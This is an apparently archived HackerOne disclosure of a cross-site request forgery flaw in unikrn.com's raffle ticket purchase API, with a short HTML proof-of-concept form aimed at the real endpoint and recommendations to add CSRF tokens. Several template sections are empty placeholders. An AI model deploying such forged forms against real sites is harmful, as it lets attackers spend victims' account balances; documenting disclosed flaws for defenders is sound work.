# CSRF in Raffles Ticket Purchasing

## Metadata
- **Source:** HackerOne
- **Report:** 272588 | https://hackerone.com/reports/272588
- **Submitted:** 2017-09-28
- **Reporter:** tolo7010
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** high
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Description:
========

An API endpoint get executed with no CSRF prevention, the endpoint did not verify session_id required in the post form. An attacker can crafted malicious form (Poc), which is executed by authenticated user action leading to huge balance lost.

Poc:
===

<!doctype html>
<html>
<head>
</head> 
<body>
<form action="https://unikrn.com/apiv2/raffle/enter" method="POST" name="myFo

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Description:
========

An API endpoint get executed with no CSRF prevention, the endpoint did not verify session_id required in the post form. An attacker can crafted malicious form (Poc), which is executed by authenticated user action leading to huge balance lost.

Poc:
===

<!doctype html>
<html>
<head>
</head> 
<body>
<form action="https://unikrn.com/apiv2/raffle/enter" method="POST" name="myForm">
<input type="hidden" name="raffle" id="raffle" value="4775">
<input type="hidden" name="tickets" id="tickets" value="1">
<input type="hidden" name="session_id" id="session_id" value="">
<input value="Submit" type="submit"">
</form>
</body>
</html>

Recommendations:
=============

- Implementing CSRF tokens.
- Validate session_id on post form/JSON api input.

</details>

---
*Analysed by Claude on 2026-05-24*
